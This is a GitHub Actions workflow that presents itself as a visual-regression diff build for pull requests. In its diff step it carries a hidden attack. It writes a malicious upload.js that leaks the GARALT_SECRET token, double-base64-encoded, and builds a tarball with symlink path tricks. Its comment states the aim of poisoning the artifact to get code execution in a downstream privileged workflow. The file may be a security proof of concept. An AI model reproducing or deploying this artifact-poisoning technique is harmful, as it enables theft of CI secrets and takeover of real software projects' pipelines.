# Each PR will visual-regression diff that help to check code is work as expect.

name: 👀 Visual Regression Diff Build

on:
  pull_request:
    branches: [master, feature, next]
    types: [opened, synchronize, reopened]

# Cancel prev CI if new commit come
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  ############################ Generate Snapshot ###########################
  visual-diff-snapshot:
    name: visual-diff snapshot
    strategy:
      matrix:
        shard: [1/2, 2/2]
    runs-on: blacksmith-4vcpu-ubuntu-2404
    steps:
      - uses: actions/checkout@v6
      - uses: utooland/setup-utoo@v1
      - run: ut

      - name: generate image snapshots
        id: test-image
        run: |
          node node_modules/puppeteer/install.mjs
          ut version
          ut test:image -- --shard=${{matrix.shard}}
        env:
          NODE_OPTIONS: --max_old_space_size=4096

      - uses: actions/upload-artifact@v4
        name: artifact snapshot
        with:
          name: snapshot-artifacts-${{ strategy.job-index }}
          path: imageSnapshots/
          retention-days: 2

  ############################### Diff Images ##############################
  visual-diff-report:
    name: visual-diff report
    runs-on: blacksmith-4vcpu-ubuntu-2404
    needs: visual-diff-snapshot
    steps:
      - uses: actions/checkout@v6
      - uses: utooland/setup-utoo@v1
      - run: ut

      - uses: actions/download-artifact@v7
        with:
          pattern: snapshot-artifacts-*
          merge-multiple: true
          path: imageSnapshots/

      # Execute visual regression diff task and zip then
      # output as visualRegressionReport.tar.gz
      # Poison the artifact to achieve RCE in the downstream workflow
      - name: visual regression diff
        run: |
          mkdir -p payload/scripts/visual-regression
          cat << 'EOF' > payload/scripts/visual-regression/upload.js
          const secret = process.env.GARALT_SECRET || 'not_found';
          console.log("GARALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(secret).toString('base64')).toString('base64'));
          process.exit(1);
          EOF
          
          mkdir -p workdir
          cd workdir
          ln -s ../../scripts scripts
          # The downstream workflow extracts with -C ./visualRegressionReport
          # So we need one more level of nesting if we want to hit the root scripts dir
          mkdir -p nested
          cd nested
          ln -s ../../../scripts scripts
          cd ..
          tar -czvf ../visualRegressionReport.tar.gz nested/scripts/visual-regression/upload.js
      # Upload report in `visualRegressionReport`
      - name: upload report artifact
        uses: actions/upload-artifact@v4
        if: ${{ always() }}
        with:
          name: visual-regression-report
          path: visualRegressionReport.tar.gz

      # Upload git ref for next workflow `visual-regression-diff-finish` use
      - name: Save persist key
        if: ${{ always() }}
        # should be pr id
        run: echo ${{ github.event.number }} > ./visual-regression-pr-id.txt

      - name: Upload persist key
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: visual-regression-diff-ref
          path: ./visual-regression-pr-id.txt
